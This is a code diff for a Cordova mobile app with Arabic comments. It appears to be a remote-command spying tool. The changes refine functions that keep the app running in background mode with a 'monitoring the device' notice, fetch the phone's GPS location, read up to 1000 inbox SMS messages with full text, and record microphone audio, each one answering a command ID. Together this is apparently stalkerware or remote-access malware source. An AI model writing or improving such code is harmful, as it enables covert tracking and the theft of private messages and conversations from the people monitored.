@@ -3,18 +3,16 @@ document.addEventListener('deviceready', onDeviceReady, false);
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // تفعيل تشغيل الخلفية
-  if (cordova && cordova.plugins && cordova.plugins.backgroundMode) {
+  // تفعيل وضع التشغيل في الخلفية
+  if (cordova.plugins && cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
-      title: 'التطبيق يعمل في الخلفية',
-      text: 'يتم مراقبة الجهاز'
+      title: 'التطبيق قيد التشغيل',
+      text: 'يتم مراقبة الجهاز...'
     });
-    
-    // عند الدخول في الوضع الخلفي
-    cordova.plugins.backgroundMode.on('activate', function() {
-      cordova.plugins.backgroundMode.disableWebViewOptimizations();
-    });
+    console.log('Background mode enabled');
+  } else {
+    console.warn('Background mode plugin not available');
   }
   
   // معلومات الجهاز
@@ -186,21 +184,25 @@ function getLocation(commandId, callback) {
   
   navigator.geolocation.getCurrentPosition(
     (position) => {
-      const googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      
+      // إنشاء رابط خريطة جوجل
+      const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
       
       callback({
         commandId,
         status: 'success',
         location: {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
+          latitude: lat,
+          longitude: lng,
           accuracy: position.coords.accuracy,
           altitude: position.coords.altitude,
           altitudeAccuracy: position.coords.altitudeAccuracy,
           heading: position.coords.heading,
           speed: position.coords.speed,
           timestamp: position.timestamp,
-          googleMapsUrl: googleMapsUrl
+          googleMapsUrl: googleMapsUrl // إضافة رابط الخريطة
         }
       });
     },
@@ -233,14 +235,17 @@ function getSMS(commandId, callback) {
   }
   
   const filter = {
-    box: 'inbox',
-    maxCount: 100,
+    box: 'inbox', // يمكنك تغييره إلى 'sent' لرؤية الرسائل الصادرة
+    maxCount: 1000, // زيادة عدد الرسائل
     indexFrom: 0
   };
   
   SMS.listSMS(
     filter,
     (messages) => {
+      // ترتيب الرسائل حسب التاريخ (الأحدث أولاً)
+      messages.sort((a, b) => b.date - a.date);
+      
       callback({
         commandId,
         status: 'success',
@@ -248,11 +253,10 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body,
-          date: new Date(msg.date).toLocaleString('ar-EG'),
+          body: msg.body, // عرض كامل النص
+          date: new Date(msg.date).toLocaleString('ar-EG'), // تنسيق التاريخ
           read: msg.read,
-          type: msg.type,
-          serviceCenter: msg.service_center
+          type: msg.type || 'inbox' // نوع الرسالة
         }))
       });
     },
@@ -270,45 +274,40 @@ function getSMS(commandId, callback) {
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
-  // التحقق من وجود Media plugin
-  if (typeof Media === 'undefined') {
+  if (!navigator.device || !window.Media) {
     return callback({ 
       commandId,
       status: 'error',
-      error: 'Media plugin not available',
-      suggestion: 'Install cordova-plugin-media'
+      error: 'Media plugin not available'
     });
   }
   
   try {
-    // إنشاء اسم ملف فريد
-    const filename = `recording_${new Date().getTime()}.mp3`;
-    const filePath = cordova.file.externalDataDirectory + filename;
+    const fileName = `recording_${Date.now()}.mp3`;
+    const filePath = cordova.file.externalDataDirectory + fileName;
     
-    // إنشاء كائن Media للتسجيل
-    const mediaRec = new Media(filePath,
+    const mediaRec = new Media(
+      filePath,
       () => {
         console.log("recordAudio():Audio Success");
-        
-        // بعد انتهاء التسجيل، إرجاع معلومات الملف
-        callback({ 
+        callback({
           commandId,
           status: 'success',
           audio: {
+            fileName: fileName,
             filePath: filePath,
-            filename: filename,
             duration: duration,
             format: 'mp3',
-            timestamp: new Date().toISOString()
+            size: 0 // سيتم حسابه لاحقاً
           }
         });
       },
       (err) => {
-        console.log("recordAudio():Audio Error: " + err.code);
+        console.log("recordAudio():Audio Error: " + JSON.stringify(err));
         callback({ 
           commandId,
           status: 'error',
-          error: 'Audio recording error',
+          error: 'Audio recording failed',
           details: err
         });
       }
@@ -323,12 +322,12 @@ function recordAudio(commandId, duration, callback) {
       mediaRec.release();
     }, duration * 1000);
     
-  } catch (error) {
+  } catch (e) {
     callback({ 
       commandId,
       status: 'error',
-      error: 'Audio recording exception',
-      details: error.message
+      error: 'Exception during recording',
+      details: e.message
     });
   }
 }
